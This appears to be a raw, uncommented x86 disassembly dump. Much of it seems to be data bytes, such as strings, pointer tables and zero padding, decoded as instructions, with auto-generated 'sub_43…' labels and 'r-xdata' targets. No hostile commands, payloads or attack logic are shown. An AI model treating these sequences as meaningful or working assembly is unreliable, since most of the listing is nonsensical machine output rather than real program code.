add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
xor eax 0xd32c0040
imul ebp [ esi + 0x67 ] 0xcb009073
inc ebx
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
rcl [ eax - 0x37 ] 0x43
inc esp
add [ eax + edx ] bh
jb r-xdata
add [ eax + eax - 0x34 ] eax
add al [ ebp ]
hlt
je r-xdata
outsd
add al dl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
adc al [ edx ]
lodsb [ esi ]
je r-xdata
inc ecx
add [ esp + ecx ] al
imul ebp [ esi + 0x67 ] 0x43ca6473
add ah ah
inc ecx
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ esp + eax * 4 + 0x44 ] bl
add [ eax - 0x63ffbb49 ] ch
lea eax [ eax + eax + 0xc ]
sbb [ edx ] eax
hlt
inc ebx
je r-xdata
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add ah bl
add [ eax + eax - 0x20 ] al
std
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ eax + edi * 8 + 0x44 ] bh
add [ ebp + esi * 8 - 0x7de7ffbc ] dl
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ eax + 0x8004408 ] cl
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax + 0x200044f6 ] cl
mov eax 0xbeb40044
inc esp
add [ esp + ecx * 8 + 0x44 ] dl
add [ eax - 0x3a ] al
inc esp
add [ ecx + ecx * 8 ] bh
inc esp
add [ esp + ecx - 0x3313ffbc ] ch
inc esp
add al dh
int3
insb
jae r-xdata
add [ ebp - 0x3483ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
int3
sub_43cc3e
inc esp
add [ edi + esi * 8 ] dh
inc esp
add [ eax + 0x800440e ] cl
add eax [ eax + eax + 0x34 ]
add eax [ eax + eax - 0x64 ]
push cs
inc esp
add [ edx + eax ] ch
inc esp
add ah al
or eax 0xdd00044
inc esp
add [ esi + ecx + 0x44 ] bl
add [ eax ] bh
inc edi
inc ebp
add [ edx + eax + 0x44 ] bh
add ah ah
or al 0x44
add [ ebp + eax + 0x2b4c0044 ] ch
inc eax
add [ ebx + ebp + 0x40 ] cl
add [ eax + 0x4c004403 ] dh
sub eax [ eax ]
xchg esp eax
push cs
inc esp
add [ eax + 0xd00440d ] ah
add [ ecx ] al
add [ eax + esi * 4 ] al
adc [ eax + 0x2bbd11 ] dh
sub al 0x0
sub eax 0xb3008700
push [ edx - 0x4f004e01 ]
push [ ebp + 0x4403c0ff ]
add [ eax ] ah
add al 0x44
add [ esp + eax ] dh
inc esp
add [ eax - 0x1bffbbf7 ] bl
add eax [ eax + eax - 0x14 ]
add eax [ eax + eax - 0xc ]
add eax [ eax + eax - 0x4 ]
add eax [ eax + eax + 0x4 ]
or eax [ eax + eax - 0x80 ]
or al 0x44
add ah ah
or eax [ eax + eax + 0x60 ]
or al 0x44
add [ esp + ecx ] ch
inc esp
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x4f736310
ja r-xdata
je r-xdata
sbb al 0x33
inc eax
add [ eax + 0xf ] bh
inc esp
add ah cl
jb r-xdata
ja r-xdata
insd
inc ebx
outsd
insd
bound ebp [ edi - 0x73 ]
inc eax
add al dh
int3
iretd
jb r-xdata
inc eax
add [ ebx + edx * 8 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sub al 0xd3
ja r-xdata
add [ edx + eax - 0x34d00000 ] dl
imul edi [ eax + 0x65 ] 0x73631364
dec edi
ja r-xdata
mov es [ ecx ]
add al 0xc
jb r-xdata
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc edx
add [ ebp + esi + 0x12480040 ] ah
jb r-xdata
add al [ ebp ]
hlt
ja r-xdata
popad
inc esp
add [ esp + eax * 4 + 0x44 ] bl
add [ eax - 0x63ffbb49 ] ch
lea eax [ eax + eax + 0xc ]
sbb [ edx ] eax
hlt
popad
bound ebp [ ebp + 0x8 ]
push ebx
je r-xdata
test [ eax + eax - 0x58 ] al
mov bh 0x44
add [ ebp + ecx * 4 + 0x190c0044 ] bl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc ebx
je r-xdata
inc edx
add ah dh
push cs
inc esp
add al ah
std
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ eax + edi * 8 + 0x44 ] bh
add [ ebp + esi * 8 - 0x7de7ffbc ] dl
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ edx + ebx - 0x4cf7ffbc ] dl
inc esp
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax + 0x200044f6 ] cl
mov eax 0xbeb40044
inc esp
add [ esp + ecx * 8 + 0x44 ] dl
add [ eax + edx ] ch
inc esp
add [ ecx + ecx * 8 ] bh
inc esp
add [ eax - 0x13ffbbf0 ] dl
int3
inc edx
add ah ch
adc eax 0x19140042
insb
jae r-xdata
add [ eax + r-xdata ] dl
add ecx [ esi ]
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
rcl ah 0xcd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] al
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
adc al 0xcd
inc ebx
add [ edx ] cl
arpl [ ebx + 0x44 ] si
jb r-xdata
inc ebx
jo r-xdata
outsd
ja r-xdata
inc ebx
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
add [ eax ] al
xor bl cl
or [ ebx + 0x73 ] ah
push ebx
imul ebp [ ebp + 0x70 ] 0x630e656c
jae r-xdata
add [ eax ] al
add al dh
jb r-xdata
jo r-xdata
into
inc ebx
add [ eax - 0x31 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
outsd
sub_43cda6
inc ebx
add [ edi + ecx * 8 ] dh
inc ebx
add [ edx + eax - 0x34d00000 ] dl
inc ebx
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0xf ] bh
inc esp
add ah cl
add al [ ebp ]
hlt
sub_43ce96
inc esp
add [ edi + esi * 8 ] dh
inc esp
add [ eax + 0x800440e ] cl
add eax [ eax + eax + 0x34 ]
add eax [ eax + eax - 0x64 ]
push cs
inc esp
add [ edx + eax ] ch
inc esp
add ah al
or eax 0xdd00044
inc esp
add [ esi + ecx + 0x44 ] bl
add [ eax ] bh
inc edi
inc ebp
add [ edx + eax + 0x44 ] bh
add ah ah
or al 0x44
add [ ebp + eax + 0x1ae80044 ] ch
inc esp
add [ eax ] cl
adc [ eax + eax - 0x50 ] al
add eax [ eax + eax - 0x24 ]
sbb al [ eax + eax - 0x6c ]
push cs
inc esp
add [ eax + 0x2800440d ] ah
or eax [ eax + eax - 0x8 ]
sbb [ eax + eax - 0x38 ] al
cmove eax [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2700040 ] dl
add [ eax ] al
or [ eax ] al
adc al 0x0
or [ eax - 0x43d343d5 ] esi
add [ edx ] eax
sldt [ ebx + 0x20ffba00 ]
adc al [ eax + eax + 0x58 ]
add al 0x44
add [ eax ] bl
sbb [ eax + eax - 0x10 ] eax
sbb [ eax + eax + 0x1c ] eax
sbb al [ eax + eax - 0x10 ]
sbb al [ eax + eax + 0x28 ]
sbb eax 0x13680044
inc esp
add [ edi ] cl
push esp
inc ebx
jne r-xdata
sub al 0xd3
je r-xdata
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0xf ] bh
inc esp
add ah cl
add al [ ebp ]
hlt
inc eax
add [ ebx + edx * 8 ] ch
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
add al bl
rol [ ebx ] 0x1
cwde
add al [ eax ]
add [ eax - 0xbffbc33 ] cl
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
iretd
sub_43cf46
inc ebx
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ esi + ecx * 4 + 0xc040041 ] dh
inc esp
add [ esp + eax * 4 + 0x44 ] bl
add [ eax - 0x63ffbb49 ] ch
lea eax [ eax + eax + 0xc ]
sbb [ edx ] eax
hlt
outsd
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc esp
add [ eax + 0x13 ] ch
inc esp
add [ edi ] cl
push esp
inc ebx
jne r-xdata
int 0x43
add ah ch
int3
sub al 0xd3
je r-xdata
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0xf ] bh
inc esp
add ah cl
add al [ ebp ]
hlt
inc eax
add [ ebx + edx * 8 ] ch
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
add al bl
rol [ ebx ] 0x1
cwde
add al [ eax ]
add [ eax - 0xbffbc33 ] cl
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
iretd
sub_43d664
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070031 ] al
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
jb r-xdata
push ebp
jo r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
inc esp
jb r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ edx ] al
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
inc ebx
insb
outsd
jae r-xdata
xor [ ecx ] 0x0
pop es
dec edi
dec edx
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
inc esp
jo r-xdata
outsb
jo r-xdata
add [ eax ] al
js r-xdata
jns r-xdata
je r-xdata
inc ebp
outsb
inc esp
jb r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
inc esp
pop edx
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
outsb
inc ebp
outsb
je r-xdata
add [ eax + 0x4f0a0036 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
inc ebp
outsb
inc esp
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
dec edi
jbe r-xdata
dec esp
push eax
outsd
jo r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
jo r-xdata
add [ eax ] al
inc esp
inc esp
add al bl
add [ eax ] eax
outsb
inc ebp
js r-xdata
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
push es
dec edi
cmp al 0x46
inc esp
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
jb r-xdata
add al [ eax ]
inc [ eax + 0x1ff0002 ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
jb r-xdata
loopne r-xdata
leave
inc ebx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0040 ] al
outsb
dec ebp
popad
jae r-xdata
insd
inc esp
pop edx
rol [ esp + eax * 2 ] 0x1
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
jb r-xdata
pop edx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003c ] al
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
leave
inc ebx
add [ eax - 0x7f00fffe ] al
add al [ eax ]
inc [ ecx ]
outsd
arpl [ ebx + 0x3c ] bp
inc esi
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
pop edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
dec edi
inc esp
outsd
arpl [ ebx - 0xc ] bp
inc ebp
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0043 ] al
jmp eax
add bh bh
loopne r-xdata
in al 0x65
jb r-xdata
add [ eax ] cl
dec edi
outsb
push ebx
insb
jae r-xdata
outsb
dec edi
insd
inc esp
pop edx
inc ecx
add [ eax ] ch
add al [ eax ]
[ eax ]
add [ eax + 0x3800441d ] cl
jg r-xdata
add [ eax + 0x1a ] cl
inc edx
add [ edi + edi * 2 + 0x19980044 ] bl
inc edx
add [ edx + ebx ] ch
inc edx
add [ eax - 0x23ffbde6 ] al
jge r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add al ah
sbb [ edx ] eax
sub al 0x1d
inc esp
inc eax
add [ eax + 0x4035 ] ah
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003e ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ edx ] cl
dec edi
arpl [ gs : esp + edi * 8 + 0x47 ] si
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
js r-xdata
outsb
push ebx
je r-xdata
inc ebx
add [ ebx ] cl
dec ecx
je r-xdata
outsb
push ebx
je r-xdata
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
test [ esp + eax * 2 ] al
call 0xffffffffe942d85c
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 8 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 8 ] ah
inc ebx
add [ esi ] bh
fild [ ebx ]
or al 0x2
add [ eax ] al
hlt
add [ eax + 0x56 ] al
inc ebp
add al bl
mov ah 0x44
add [ eax + eax * 4 ] ch
inc esp
add [ eax + eax * 4 + 0x44 ] ch
add [ eax + 0x7f ] bl
inc esp
add [ esi + edx * 2 + 0x45 ] dl
add [ eax + 0x56 ] bl
inc ebp
add [ edi + edi * 2 + 0x44 ] bh
add ah ch
jl r-xdata
add [ eax + 0x1d ] dl
inc esp
add [ eax + 0x7e ] dl
inc esp
add [ ebp + edx * 2 - 0x4b2fffbb ] ah
inc esp
add al cl
jg r-xdata
add [ edx + ebx ] dl
inc edx
add al dh
jle r-xdata
inc esp
jb r-xdata
inc esp
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
fld [ ebx ]
sub al 0x0
add [ eax ] al
cmp al 0x4f
dec edi
add [ ebp + esi + 0x12480040 ] ah
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esi + esi * 4 ] al
inc esp
add ah cl
add al [ ebp ]
hlt
add [ ecx ] dl
push esp
inc edx
jne r-xdata
add [ esi + edi * 2 + 0x55f40044 ] al
inc ebp
add [ eax ] cl
push esi
inc ebp
add [ esi + edi * 2 + 0x56300044 ] bh
inc ebp
add [ eax ] bl
jg r-xdata
add [ eax ] al
inc ecx
add [ edx + eax ] bh
add bh bh
or al 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ 0x6d657449 ] al
jae r-xdata
in al 0x65
lea eax [ eax + eax + 0xc ]
sbb [ edx ] eax
hlt
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ ebp + ecx * 4 + 0x190c0044 ] bl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add ah ch
sbb eax 0xfde00044
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ eax + edi * 8 + 0x44 ] bh
add [ ebp + esi * 8 - 0x7de7ffbc ] dl
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ eax + 0x800441e ] bh
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax + 0x200044f6 ] cl
mov eax 0xbeb40044
inc esp
add [ esp + ecx * 8 + 0x44 ] dl
add [ eax + 0x3c00441f ] ch
leave
inc esp
add [ edi + eax * 8 + 0x44 ] ch
add ah ch
int3
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xda54c08b
inc ebx
sub_43da31
push ecx
inc esp
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esi + esi * 4 ] al
inc esp
add ah cl
add al [ ebp ]
hlt
sub_43db80
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp st4
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 8 - 0x2331ffbd ] bl
inc ebx
add [ eax ] bl
add al [ eax ]
add [ eax ] cl
fiadd [ ebx ]
hlt
sub_43dbd0
mov ah 0x8e
inc ecx
add [ eax + 0x5c0044b0 ] cl
test [ eax + eax - 0x58 ] al
mov bh 0x44
add [ ebp + ecx * 4 + 0x190c0044 ] bl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add al ah
pop ds
inc esp
add al ah
std
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ eax + edi * 8 + 0x44 ] bh
add [ ebp + esi * 8 - 0x7de7ffbc ] dl
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ eax + 0x800441e ] bh
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax + 0x200044f6 ] cl
mov eax 0xbeb40044
inc esp
add [ esp + ecx * 8 + 0x44 ] dl
add ah dh
and [ eax + eax + 0x3c ] al
leave
inc esp
add [ eax ] dh
and [ eax + eax - 0x14 ] eax
int3
sub_43dc8a
inc esp
add [ edi + esi * 8 ] dh
inc esp
add [ eax - 0x4bffbbe2 ] dl
push ds
inc esp
add [ eax + 0x44 ] ch
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
dec eax
[ ecx + 0x44 ]
add dh bh
fcom [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
je r-xdata
popad
inc esp
add [ edi + ecx * 4 - 0x701bffbc ] dh
inc esp
add al cl
scasd [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
push [ eax ]
outsb
mov eax eax
fcomp st4
inc ebx
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
loopne r-xdata
add [ eax ] cl
inc edx
je r-xdata
inc esp
popa
jne r-xdata
cmp al [ eax + eax + 0x7a ]
add [ eax ] al
add bh bh
mov al [ 0x10044b4 ]
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax + 0x4208000d ] al
outsb
enter 0x43db 0x0
push eax
fild [ ebx ]
xor [ eax ] eax
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
inc eax
and [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
pop es
popad
add [ eax ] al
jmp eax
add al dh
jno r-xdata
pop eax
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax + eax ] bh
add dh bh
add [ ebx + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
inc edx
inc esp
add [ ecx ] ah
add bh bh
loopne r-xdata
add ah cl
and [ eax + eax + 0x50 ] eax
and al [ eax + eax + 0x48 ]
and [ eax + eax - 0x30 ] eax
and al [ eax + eax - 0x5c ]
and al [ eax + eax + 0x44 ]
and [ eax + eax + 0x68 ] al
and [ eax + eax + 0x7 ] al
push esp
inc edx
jne r-xdata
mov ebp 0xffeb0014
enter 0x5cff 0x21
inc esp
inc esp
add [ ebx + eax * 4 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
cld
sub_43e250
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jecxz r-xdata
inc ecx
add [ eax + 0x5c0044b0 ] cl
test [ eax + eax - 0x58 ] al
mov bh 0x44
add [ ebp + ecx * 4 + 0x190c0044 ] bl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ ebx ] bl
inc esp
add al ah
std
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ eax + edi * 8 + 0x44 ] bh
add [ ebp + esi * 8 - 0x7de7ffbc ] dl
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ eax + 0x800441e ] bh
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax + 0x200044f6 ] cl
mov eax 0xbeb40044
inc esp
add [ esp + ecx * 8 + 0x44 ] dl
add [ 0xffffffffc93c0044 ] cl
inc esp
add [ ebp + 0x44 ] ah
add ah ch
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1d ] ch
inc ebx
add [ edx + 0x140043e3 ] al
add al [ eax ]
add [ eax ] cl
fiadd [ ebx ]
hlt
sub_43e46f
xchg esp eax
push ds
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
inc ebx
push 0x656b6365
cwde
daa
inc edx
add [ eax ] dh
add bh bh
push esp
xchg ecx eax
inc esp
add [ eax - 0x6f ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x11ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
xchg ecx eax
inc edx
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x10044b4 ]
sub_43eb82
inc esp
add [ edi + esi * 8 ] dh
inc esp
add [ esi ] al
add [ edi * 4 - 0x42c842eb ] dl
adc al 0x0
add [ eax + 0x200044f6 ] cl
mov eax 0xbeb40044
inc esp
add [ esp + ecx * 8 + 0x44 ] dl
add [ edi ] al
inc esp
add [ ecx + ecx * 8 ] bh
inc esp
add [ eax - 0x13ffbbd9 ] cl
int3
inc eax
add al al
jmp r-xdata
inc edx
inc esp
add [ ecx ] ah
add bh bh
loopne r-xdata
mov bl 0xff
mov dl 0xff
fsubr [ ebx ]
inc esp
add ah ah
sub eax [ eax + eax - 0x14 ]
sub eax [ eax + eax + 0x14 ]
sub al 0x44
add [ eax - 0x5bffbbd6 ] al
sub al [ eax + eax + 0xa ]
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
mov ebp 0x14bd37
inc esp
add [ ebx + eax * 4 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
cld
pop eax
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
jmp [ eax + ebp + 0x44 ]
jae r-xdata
add dh bh
fcom [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
or eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x42ec6564
add bh bh
sub [ fs : eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
